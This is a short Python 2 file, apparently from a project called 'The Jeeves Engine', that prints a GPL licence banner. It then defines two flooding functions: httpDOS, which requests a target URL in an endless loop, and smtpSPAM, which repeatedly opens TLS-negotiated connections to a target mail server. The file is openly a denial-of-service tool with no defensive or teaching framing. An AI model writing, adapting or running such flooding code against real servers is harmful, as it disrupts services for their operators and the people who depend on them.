
print """
The Jeeves Engine is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    The Jeeves Engine is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with the Jeeves Engine.  If not, see <http://www.gnu.org/licenses/>.
"""

def httpDOS(url):
	while 1:
		try:
			import urllib2
			urllib2.urlopen(url)
		except:	
			print "Website not available"


def smtpSPAM(address, port):
	import smtplib
	while 1:

		try:
			smtpServ = smtplib.SMTP(address, port)
			smtpServ.ehlo()
			smtpServ.starttls()
			smtpServ.ehlo()
		except:
			print "Server Connection Unavailable"

